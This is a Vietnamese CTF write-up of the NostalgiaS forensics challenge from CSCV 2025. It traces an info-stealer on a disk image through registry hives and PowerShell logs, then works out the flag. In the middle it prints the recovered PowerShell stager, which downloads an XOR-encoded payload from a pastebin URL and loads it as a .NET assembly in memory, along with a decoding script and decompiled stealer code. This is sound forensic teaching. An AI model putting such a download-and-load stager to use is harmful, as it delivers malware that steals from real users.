---
title: "CSCV 2025 – NostalgiaS"
description: "Writeup bài NostalgiaS – CSCV CTF 2025"
published: 2025-10-22
tags: ["CTF", "CSCV2025", "Forensics"]
category: "CTF - writeup"
draft: false
---



# **NostalgiaS Write-up**

NostalgiaS là một challenge thuộc mảng Digital Forensics trong cuộc thi Sinh Viên An Ninh Mạng 2025 (Cyber Security Contest VietNam 2025), cuộc thi quy tụ rất nhiều đội CTF mạnh trong cộng đồng sinh viên ở Việt Nam cũng như một số nước khu vực Asian.

Đây là writeup chia sẻ về quá trình và hướng giải mình giải bài NostalgiaS này khi thi, nếu có sai sót hay cần cải thiện thì mong được mọi người góp ý.


![505926932_1277511053948477_3074998489741789929_n](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/BylVE8UAxg.jpg)


-------------------------------------
Đây là description của đề
![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/SyXsMumReg.png)

Oke, chúng ta tải file challenge của đề và bắt đầu thôi.

![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/HJ329dQRxl.png)

đề cung cấp cho ta một file **.ad1** ([có thể tìm hiểu thêm ở đây](https://dfir.science/2021/09/What-is-an-AD1.html)), và công cụ không thể thiếu để phân tích file này FTK Imager.

Sau khi load evidence vào FTK Imager, ta được như sau:
![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/Bye33O7Aeg.png)

Có thể thấy author đã dump ổ cứng cho chúng ta khá đầy đủ.

Ở thư mục Users, có một người dùng với username là **kadoyat**, bắt đầu từ đây thoi.

Sau một lúc lục lọi thì thì ở thư mục Documents của user **kadoyat**, tôi thấy có các file Excel Macro: *accounting.xlsm, budget_tracking.xlsm, và một file zip tax_calculation.zip chứa tệp tax_calculation.xlsm*. Những file này hỗ trợ macro để lưu trữ các script VBA, và hacker có thể lợi dụng để chèn các mã độc hại, lợi dụng khi người dùng mở file để kích hoạt. Chúng ta sẽ dump các file macro đó để kiểm tra.

Với các file *accounting.xlsm, budget_tracking.xlsm* thì script VBA không có gì nguy hiểm, chỉ là hỗ trợ trong kế toán thoi, còn file zip *tax_calculation.zip* cần có mật khẩu để giải nén 
![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/ryxpBQI0lg.png)

Khá mờ ám, chúng ta thử dùng Hashcat để crack xem trong file có đính kèm mã độc không.
![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/Skxiv7LAxl.png)

crack thành công mật khẩu của file *tax_calculation.zip* này là *"secret"*. Nhưng một lần nữa, script VBA trong file .xlsm này cũng không có gì nguy hiểm. Có vẻ đây là cách lạc hướng của tác giả.

Tiếp theo hãy thử dump các registry như *NTUSER.DAT, SYSTEM, SOFTWARE* xem có gì thú vị có thể tìm thấy trong các hive này không.

![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/r1_EhXUCxe.png)

Chúng ta sẽ dùng tool **Regripper** để kiểm tra. 
Đầu tiên là plugin **runmru** của RegRipper để lấy và trình bày các mục từ RunMRU (artifact của hộp Run — Win+R) trong hive người dùng.

![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/SkL2bVU0ll.png)

Cũng không thấy gì đáng chú ý

Tiếp theo thì thử dùng plugin **userassist**. Plugin này đọc dữ liệu từ UserAssist keys trong file NTUSER.DAT để hiển thị chương trình hoặc file mà người dùng đã thực sự chạy

📂 Vị trí Registry mà plugin truy cập
userassist plugin phân tích các khóa:
*"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\""*

![Screenshot 2025-10-22 173526](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/Byf14NLCgg.png)

Ta có thể thấy *powershell.exe* đã được dùng, hmmm có vẻ khá sus. Phải kiểm tra xem powershell đã được dùng để thực thi cái gì.

rất may là tác giả đã dump cho ta khá đầy đủ, bao gồm các log của Windows Events, đặc biệt là *Microsoft-Windows-PowerShell/Operational* (chuyên ghi lại hoạt động thực thi của PowerShell)

![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/HJ7RS4URgl.png)

chúng ta sẽ đặc biệt để ý đến **EventID 4104**, vì nó ghi nội dung script hoặc đoạn mã đã chạy (rất chi tiết — thường chứa payload của malware).

Chúng ta sẽ dùng tool **EvtxECmd** trong bộ công cụ điều tra số của *Eric Zimmerman*, để xuất các **EventID 4104** dưới dạng file .csv để dễ dàng quan sát hơn
![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/HkatiE8Aee.png)

ở đây chúng ta thấy một event cực kì đáng nghi
![Screenshot 2025-10-22 181852](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/rJs0a4LClg.png)

để mình viết lại cho dễ nhìn
```
$AssemblyUrl = "https://pastebin.com/raw/90qeYSHA"
$XorKey = 0x24
$TypeName = "StealerJanai.core.RiderKick"
$MethodName = "Run"
try {
    $WebClient = New-Object System.Net.WebClient
    $encodedContent = $WebClient.DownloadString($AssemblyUrl)
    $WebClient.Dispose()

    $hexValues = $encodedContent.Trim() -split ',' | Where-Object { $_ -match '^0x[0-9A-Fa-f]+$' }

    $encodedBytes = New-Object byte[] $hexValues.Length
    for ($i = 0; $i -lt $hexValues.Length; $i++) {
        $encodedBytes[$i] = [Convert]::ToByte($hexValues[$i].Trim(), 16)
    }

    $originalBytes = New-Object byte[] $encodedBytes.Length
    for ($i = 0; $i -lt $encodedBytes.Length; $i++) {
        $originalBytes[$i] = $encodedBytes[$i] -bxor $XorKey
    }

    $assembly = [System.Reflection.Assembly]::Load($originalBytes)

    if ($TypeName -ne "" -and $MethodName -ne "") {
        $targetType = $assembly.GetType($TypeName)
        $methodInfo = $targetType.GetMethod($MethodName, [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
        $methodInfo.Invoke($null, $null)
    }
} catch {
    exit 1
}

```
Tóm tắt thì script này có workflow như sau:
1. Tải chuỗi dữ liệu từ pastebin.com/raw/90qeYSHA.
1. Chuỗi này là danh sách hex (ví dụ 0xAF,0x1C,...).
1. Tạo mảng byte từ hex, XOR từng byte với 0x24 để giải mã → thu được originalBytes.
1. Dùng [System.Reflection.Assembly]::Load để load bytes như .NET assembly (DLL/EXE) trực tiếp vào memory.
1. Sau đó lấy type StealerJanai.core.RiderKick và gọi phương thức tĩnh Run() 

thì không thể bàn cãi gì thêm đây chính là quá trình stager của mã độc 

Tiếp theo thì tạo một script để tải và giải mã payload gốc từ *Pastebin*, lưu thành file binary để tiện cho việc phân tích nhưng không thực thi

```
$u="https://pastebin.com/raw/90qeYSHA"
$k=0x24
$out="decoded.bin"
$wc=New-Object System.Net.WebClient
$txt=$wc.DownloadString($u)
$wc.Dispose()
$hex=$txt.Trim() -split ',' | Where-Object{$_ -match '^0x[0-9A-Fa-f]+$'}
$enc=[byte[]]::new($hex.Length)
for($i=0;$i -lt $hex.Length;$i++){ $enc[$i]=[Convert]::ToByte($hex[$i].Trim(),16) }
$dec=[byte[]]::new($enc.Length)
for($i=0;$i -lt $enc.Length;$i++){ $dec[$i]=$enc[$i] -bxor $k }
[IO.File]::WriteAllBytes($out,$dec)
```

Nhưng do author đã disable *"https://pastebin.com/raw/90qeYSHA"*, rất may là trong lúc làm bài khi thi, mình vẫn còn giữ sample.

![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/rkI84rURll.png)

bỏ vào tool **Exeinfo PE** để kiểm tra bước đầu

![Screenshot 2025-10-22 185057](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/rkqBrH80el.png)


chúng ta có thể dự đoán rất có khả năng file đó được biên dịch bằng .NET, cụ thể là C#

chúng ta sẽ mở file này với **dnspy**.

![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/r1vCDrI0le.png)

Xem sơ qua thì đây là một con info stealer, với C2 là một *Discord Webhook* (ảnh chụp bên trên có một phần cấu hình *Discord Webhook*). Nhưng do bài hành vi của mã độc tác động nhiều đến việc lấy được flag, nên mình sẽ không đi sâu vào phân tích hành vi, hay C2 để đỡ mất thời gian.


tiếp theo để ý ở class **SystemSecretInformationCollector**
![Screenshot 2025-10-22 191347](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/ry2T5H8Rll.png)
có thể thấy là nó đang cố decode và tạo một string gì đấy, bao gồm các kí tự như **_**, **}** => rất giống format của một flag CTF. Hãy phân tích kĩ hàm này.

```
using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;

namespace StealerJanai.component.systeminfo
{
	// Token: 0x02000010 RID: 16
	public class SystemSecretInformationCollector
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00003BB4 File Offset: 0x00001DB4
		public string Collect()
		{
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				string text = this.DecodeMagicToString("AuEcc3iNuamB9JOyfS1pel55JqxgJ83");
				string machineName = Environment.MachineName;
				string text2 = this.DecodeMagicToString("sA0m1sPHdceUL6HSvGAbFuhN");
				string registryValue = this.GetRegistryValue();
				string value = string.Concat(new string[]
				{
					text,
					machineName,
					"_",
					text2,
					registryValue,
					"}"
				});
				stringBuilder.Append(value);
			}
			catch (Exception ex)
			{
				stringBuilder.AppendLine(string.Format("Error: {0}", ex.Message));
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003C58 File Offset: 0x00001E58
		private string DecodeMagicToString(string input)
		{
			string result;
			try
			{
				if (string.IsNullOrEmpty(input))
				{
					result = string.Empty;
				}
				else
				{
					List<byte> list = new List<byte>();
					foreach (char value in input)
					{
						int num = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".IndexOf(value);
						if (num < 0)
						{
							return "Invalid character";
						}
						int j = num;
						for (int k = list.Count - 1; k >= 0; k--)
						{
							int num2 = (int)(list[k] * 62) + j;
							list[k] = (byte)(num2 % 256);
							j = num2 / 256;
						}
						while (j > 0)
						{
							list.Insert(0, (byte)(j % 256));
							j /= 256;
						}
					}
					int num3 = 0;
					while (num3 < list.Count && list[num3] == 0)
					{
						num3++;
					}
					if (num3 >= list.Count)
					{
						result = string.Empty;
					}
					else
					{
						byte[] array = new byte[list.Count - num3];
						for (int l = 0; l < array.Length; l++)
						{
							array[l] = list[num3 + l];
						}
						result = Encoding.ASCII.GetString(array);
					}
				}
			}
			catch (Exception ex)
			{
				result = "Decode error: " + ex.Message;
			}
			return result;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00003DC8 File Offset: 0x00001FC8
		private string GetRegistryValue()
		{
			string result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\hensh1n"))
				{
					if (registryKey != null)
					{
						object value = registryKey.GetValue("");
						if (value != null)
						{
							return value.ToString();
						}
					}
				}
				result = "Registry key not found";
			}
			catch (Exception ex)
			{
				result = "Registry error: " + ex.Message;
			}
			return result;
		}

		// Token: 0x0400000B RID: 11
		private const string MagicChars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	}
}

```

ta có thể thấy

hàm *public string Collect()*

Gọi DecodeMagicToString hai lần với hai hằng mã hoá, lấy Environment.MachineName, lấy giá trị registry **SOFTWARE\\hensh1n** qua GetRegistryValue(), rồi ghép thành chuỗi:
**<decoded1><MachineName>_<decoded2><registryValue>}**
    
Mình đã giải mã hai chuỗi trong code (theo thuật toán class cung cấp):

* "AuEcc3iNuamB9JOyfS1pel55JqxgJ83" -> **CSCV2025{your_computer_**
* "sA0m1sPHdceUL6HSvGAbFuhN" -> **has_be3n_kicked_by**

còn lại <**MachineName**> và <**registryValue**> ở **SOFTWARE\\hensh1n**

với **MachineName** ta dễ dàng có được trong hive **SYSTEM**

![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/SkeNCrURle.png)

và **registryValue** thì ở HKCU\SOFTWARE\\hensh1n
![image](https://raw.githubusercontent.com/SawG23/CTF-writeups/main/asset/NostalgiaS/Bkt30rLCge.png)

kết hợp tất cả lại ta được flag:

**CSCV2025{your_computer_DESKTOP-47ICHL6_has_be3n_kicked_by_HxrYJgdu}**
    
Cảm ơn các bạn đã đọc đến đây, chúc một ngày tốt lành

(\\_/)    
(•.•)     
(>☕    
    
SawG, a.k.a EagleBoiz
